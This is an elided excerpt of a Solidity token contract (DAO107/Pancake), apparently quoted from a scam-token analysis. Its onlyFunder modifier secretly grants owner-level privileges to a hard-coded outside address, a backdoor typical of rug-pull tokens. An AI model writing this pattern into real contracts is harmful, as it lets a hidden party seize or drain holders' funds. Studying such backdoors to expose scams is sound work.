...
abstract contract DAO107 is IERC20, Ownable {
    ...
    modifier onlyFunder() {
        require(_owner == msg.sender || 0x7a8EB23DbD0b6cE48022701D1562E4B9FF374FAb == msg.sender, "!Funder");
        _;
    }
...
contract Pancake is DAO107 {
    constructor() DAO107(
        ...
        address(0x79ec9B8589099eb94df669D55d33Ed6fa33149db),

        address(0x2db0372058Dddb0A69d3c8472075A7d082d96CF5)
    ){
